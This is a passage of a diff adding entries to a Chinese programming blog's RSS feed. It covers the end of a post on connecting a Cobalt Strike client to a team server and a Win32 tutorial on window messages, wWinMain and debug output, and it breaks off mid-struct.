+&lt;p&gt;输入主机 ip，连接端口 (默认 50050)，以及你想使用的用户名和服务端启动时设置的密码然后点击连接就可以连接到服务器了。&lt;/p&gt;
+&lt;p&gt;点击 Connect 连接后，会有个提示信息，如果承认提示信息中的哈希值就是所要连接团队服务器的哈希值就点击 Yes，随后即可打开 CS 客户端界面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;在连接后，团队之间就可以通过客户端进行沟通，信息共享。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://self-ferry.github.io/2021/07/05/Win%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/</guid>
+            <title>Win消息机制和消息类型</title>
+            <link>https://self-ferry.github.io/2021/07/05/Win%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6%E5%92%8C%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/</link>
+            <category term="Win32编程" scheme="https://self-ferry.github.io/categories/Win32%E7%BC%96%E7%A8%8B/" />
+            <category term="窗口程序" scheme="https://self-ferry.github.io/tags/%E7%AA%97%E5%8F%A3%E7%A8%8B%E5%BA%8F/" />
+            <category term="消息机制" scheme="https://self-ferry.github.io/tags/%E6%B6%88%E6%81%AF%E6%9C%BA%E5%88%B6/" />
+            <category term="消息类型" scheme="https://self-ferry.github.io/tags/%E6%B6%88%E6%81%AF%E7%B1%BB%E5%9E%8B/" />
+            <pubDate>Mon, 05 Jul 2021 22:48:49 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;事件和消息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件和消息&#34;&gt;#&lt;/a&gt; 事件和消息&lt;/h1&gt;
+&lt;p&gt;Windows 中的事件是一个 &amp;quot;动作&amp;quot;，这个动作可能是用户操作应用程序产生的，也可能是 Windows 自己产生的.&lt;br /&gt;
+ 而消息，就是用来描述这些 &amp;quot;动作&amp;quot; 的，比如：&lt;/p&gt;
+&lt;p&gt;1 这个动作是什么时候产生的？&lt;br /&gt;
+2 哪个应用程序产生的？&lt;br /&gt;
+3 在什么位置产生的？&lt;br /&gt;
+等等。。。&lt;/p&gt;
+&lt;h2 id=&#34;事件驱动消息-消息封装事件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件驱动消息-消息封装事件&#34;&gt;#&lt;/a&gt; 事件驱动消息 消息封装事件&lt;/h2&gt;
+&lt;p&gt;Windows 为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息.&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;tagMSG&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;    &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            HWND hwnd&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 窗口句柄&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            UINT message&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 消息类型&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            WPARAM wParam&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 对消息类型进一步描述&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            LPARAM lParam&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 同上&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            DWORD time&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 动作发生时间&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            POINT pt&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;     &lt;span class=&#34;token comment&#34;&gt;// 坐标，结构体封装了，内部是 x，y&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; MSG&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;PMSG&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;说明：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1、hwnd&lt;br /&gt;
+ 表示消息所属的窗口&lt;br /&gt;
+一个消息一般都是与某个窗口相关联的&lt;br /&gt;
+在 Windows 中 HWND 类型的变量通常用来标识窗口。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;2、message&lt;br /&gt;
+ 在 Windows 中，消息是由一个数值来表示的&lt;br /&gt;
+但是由于数值不便于记忆，所以 Windows 将消息对应的数值定义为 WM_XXX 宏（WM == Window Message）&lt;br /&gt;
+鼠标左键按下 WM_LBUTTONDOWN        键盘按下 WM_KEYDOWN&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;3、wParam 和 lParam&lt;br /&gt;
+32 位消息的特定附加信息，具体表示什么处决于 message&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;4、time&lt;br /&gt;
+ 消息创建时的时间&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;5、消息创建时的鼠标位置&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;具体来说：如下图，用户输入后，封装成消息，加入系统的消息队列，然后应用程序那还有队列&lt;/p&gt;
+&lt;p&gt;用来存储自己的消息队列，所以系统队列到应用程序队列是分流而治的过程。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image004.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;从队列中取出消息，使用的是循环机制，就是不停的取出消息，而后面的判断消息类型是不是我们关心的意思其实是&lt;/p&gt;
+&lt;p&gt;我们是否写了该消息下的响应函数，或者说回调函数。&lt;/p&gt;
+&lt;p&gt;具体流程如下图：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image005.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;消息机制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#消息机制&#34;&gt;#&lt;/a&gt; 消息机制&lt;/h1&gt;
+&lt;p&gt;我们了解了窗口其实是绘制出来的，而且是不断绘制的过程，所以窗口的本质是绘制， 但是我们现在看到的窗口程序，都可以点击关闭按钮 使用鼠标点击会有反应.&lt;/p&gt;
+&lt;p&gt;而我们要怎么实现呢？&lt;/p&gt;
+&lt;p&gt;其实鼠标点击是产生了一个消息。window 把这个消息封装成了消息结构体。 发送给了我们的窗口程序。&lt;/p&gt;
+&lt;p&gt;那么 windows 怎么知道你点击的那个窗口呢？&lt;/p&gt;
+&lt;p&gt;是这样的 当我们点击的时候 会记录点击坐标。消息。等等 windows 系统会接受到 然后遍历内核中的 WINOBJ 结构 而这个结构中存储着窗口对象 窗口对象对应着消息线程.&lt;/p&gt;
+&lt;p&gt;所以 windows 一层一层的遍历。则找到了对应的窗口以及窗口对应的线程。然后发送给我们的应用程序&lt;/p&gt;
+&lt;p&gt;上面说的我们需要了解 要知道消息怎么产生的 怎么传递的。那么下面编程就明白了.&lt;/p&gt;
+&lt;p&gt;例如下图:&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image001.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;每个应用程序都有一个线程对象 而这个线程对象如果创建窗口。那么内核中就有这个窗口对象.&lt;/p&gt;
+&lt;p&gt;如果我们有鼠标点击的消息。键盘消息等等。操作系统都会遍历窗口对象 而窗口对象也会保存着创建这个窗口对象对应的线程对象 而这个线程对象中则有消息队列.&lt;/p&gt;
+&lt;p&gt;这样的话操作系统则会封装消息发送给我们窗口对象&lt;/p&gt;
+&lt;h1 id=&#34;消息类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#消息类型&#34;&gt;#&lt;/a&gt; 消息类型&lt;/h1&gt;
+&lt;p&gt;我们回调中有我们的消息类型，我们可以判断消息类型进行我们不同的操作。&lt;/p&gt;
+&lt;p&gt;比如菜单消息&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;WM_COMMAND&lt;/code&gt; ， 如果是这个消息。那么回调函数的 &lt;code&gt;wparam&lt;/code&gt;  等附加信息就是 &lt;code&gt;WM_COMMAND&lt;/code&gt;  的附加消息了 我们可以取低位得出操作的菜单 ID. 进而进行消息处理.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;WM_PAINT&lt;/code&gt;  这个消息是绘制的消息。我们知道。窗口是不断绘制的。所以绘制消息会一直来.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;WM_DESTROY&lt;/code&gt;   窗口关闭消息 如果接受到这个消息。则调用 API 往消息队列中 (MSG) 中传递退出消息 此时外层主线程就会结束.&lt;/p&gt;
+&lt;p&gt;具体 API:&lt;br /&gt;
+ &lt;code&gt;postQuitMessage(0);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;当前具体的消息还要查询 MSDN, 因为消息种类很多.&lt;/p&gt;
+&lt;p&gt;windows 消息都是 WM 开头的&lt;/p&gt;
+&lt;p&gt;比如查询 &lt;code&gt;WM_COMMAND&lt;/code&gt;  消息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image003.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以清楚的看到它会告诉你如果是 &lt;code&gt;WM_COMMAND&lt;/code&gt;  消息来了那么回调函数的参数分别代表的是什么意思。&lt;/p&gt;
+&lt;h1 id=&#34;窗口类结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#窗口类结构&#34;&gt;#&lt;/a&gt; 窗口类结构&lt;/h1&gt;
+&lt;p&gt;创建窗口程序&lt;/p&gt;
+&lt;h2 id=&#34;进行窗口编程需要注意的问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进行窗口编程需要注意的问题&#34;&gt;#&lt;/a&gt; 进行窗口编程需要注意的问题&lt;/h2&gt;
+&lt;p&gt;在 Windows 中进行窗口编程，入口点已经改成 WinMain 了 有四个参数&lt;/p&gt;
+&lt;p&gt;如以下代码所示&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; APIENTRY &lt;span class=&#34;token function&#34;&gt;wWinMain&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;_In_ HINSTANCE hInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;               &lt;span class=&#34;token comment&#34;&gt;// 窗口的实例句柄 hinstance 代表模块意思 HWND 代表窗口意思 HANDLE 代表内核对象 HDC 设备上下文&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                     _In_opt_ HINSTANCE hPrevInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;        &lt;span class=&#34;token comment&#34;&gt;// 父窗口句柄   已淘汰&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                     _In_ LPWSTR    lpCmdLine&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;                &lt;span class=&#34;token comment&#34;&gt;// 命令行参数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                     _In_ &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;       nCmdShow&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                 &lt;span class=&#34;token comment&#34;&gt;// 命令 最大化命令还是最小化命令&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;wWinMain&lt;/code&gt;  因为有 &lt;code&gt;UNICODE&lt;/code&gt;  跟 &lt;code&gt;ASCII&lt;/code&gt;  区别，所以 &lt;code&gt;UNICODE&lt;/code&gt;  使用 &lt;code&gt;wWinMain&lt;/code&gt; ， &lt;code&gt;ASCII&lt;/code&gt;  版就是用 &lt;code&gt;WinMain&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这里我上网上查了一下&lt;/p&gt;
+&lt;p&gt;其实并不是程序中有中文时就必须用 &lt;code&gt;Unicode&lt;/code&gt;  字符集，当 &lt;code&gt;windows&lt;/code&gt;  系统语言为中文时，不管你选择哪个字符集都是可以正常显示中文的，但是系统语言不为中文时就会出现乱码了。所以如果你的软件需要适应多语言的 &lt;code&gt;windows&lt;/code&gt;  系统的话就得用 &lt;code&gt;Unicode&lt;/code&gt;  字符集。&lt;/p&gt;
+&lt;p&gt;另外需要说明的是，当字符集为 &lt;code&gt;Unicode&lt;/code&gt;  时，向 api 函数传递的一个字符串的时候应该将该字符串转换为 &lt;code&gt;Unicode&lt;/code&gt;  编码的，可用 L 转换：&lt;br /&gt;
+ &lt;code&gt;CreateWindow(wndClass, L&amp;quot;这是窗口标题&amp;quot;, ......);&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;进行windows编程的调试手法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进行windows编程的调试手法&#34;&gt;#&lt;/a&gt; 进行 Windows 编程的调试手法&lt;/h2&gt;
+&lt;p&gt;在 Windows 中我们调试程序不能简单的使用 printf 进行调试。或者打印输出了 我们可以使用两个 API 进行操作.&lt;/p&gt;
+&lt;p&gt;1  &lt;code&gt;wsprintf()&lt;/code&gt;  格式化字符串&lt;/p&gt;
+&lt;p&gt;2  &lt;code&gt;OutPutDebugString()&lt;/code&gt;  输出调试字符串&lt;/p&gt;
+&lt;p&gt;详细参见百科：&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS93c3ByaW50Zg==&#34;&gt;https://baike.baidu.com/item/wsprintf&lt;/span&gt;&lt;br /&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9PdXRwdXREZWJ1Z1N0cmluZw==&#34;&gt;https://baike.baidu.com/item/OutputDebugString&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;因为 &lt;code&gt;OutPutDebugString()&lt;/code&gt;  只能打印固定字符串&lt;/p&gt;
+&lt;p&gt;所以使用 wsprintf 进行格式化字符串，如下面代码&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; APIENTRY &lt;span class=&#34;token function&#34;&gt;wWinMain&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;_In_ HINSTANCE hInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    _In_opt_ HINSTANCE hPrevInstance&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    _In_ LPWSTR    lpCmdLine&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    _In_ &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;       nCmdShow&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    TCHAR str&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;wsprintf&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; L&lt;span class=&#34;token string&#34;&gt;&#34;%s&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; L&lt;span class=&#34;token string&#34;&gt;&#34;HelloWin32&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token comment&#34;&gt;//MessageBox (0, str, 0, MB_OK);// 也可以弹个窗&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;OutputDebugString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;str&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我们编译出程序之后，可以使用 DebugView 这款工具查看，也可以在编译器的调试窗口看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;image002.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;窗口编程的步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#窗口编程的步骤&#34;&gt;#&lt;/a&gt; 窗口编程的步骤&lt;/h2&gt;
+&lt;p&gt;1 创建窗口类&lt;br /&gt;
+ windows 提供的窗口样式。我们需要给定.&lt;/p&gt;
+&lt;p&gt;2 注册窗口类&lt;br /&gt;
+创建了窗口我们需要注册到 windows 系统中.&lt;/p&gt;
+&lt;p&gt;3 创建窗口&lt;/p&gt;
+&lt;p&gt;如果注册窗口成功。那么我们需要创建出来这个窗口。并且显示跟更新.&lt;/p&gt;
+&lt;p&gt;4 消息处理&lt;/p&gt;
+&lt;h2 id=&#34;窗口编程需要的主要结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#窗口编程需要的主要结构&#34;&gt;#&lt;/a&gt; 窗口编程需要的主要结构&lt;/h2&gt;
+&lt;p&gt;窗口的创建 Windows 已经为我们提供了，这个结构就是 &lt;code&gt;WNDCLASSEX&lt;/code&gt;  结构&lt;/p&gt;
+&lt;p&gt;看下这个结构中的内容吧&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;_WNDCLASSEX&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    UINT       cbSize&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                   扩展的大小 既自己WndClass本身大小&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    UINT       style&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                    风格&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    WNDPROC    lpfnWndProc&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;              窗口回调&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;消息都要进入这个回调&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;        cbClsExtra&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;              &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;        cbWndExtra&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    HINSTANCE  hInstance&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                实例句柄&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    HICON      hIcon&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                    图标&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    HCURSOR    hCursor&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                  光标&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    HBRUSH     hbrBackground&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;            背景&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    LPCTSTR    lpszMenuName&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;             菜单名称&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    LPCTSTR    lpszClassName&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;            类名称&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    HICON      hIconSm&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;                  最小化图标&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; WNDCLASSEX&lt;span class=&#34;token 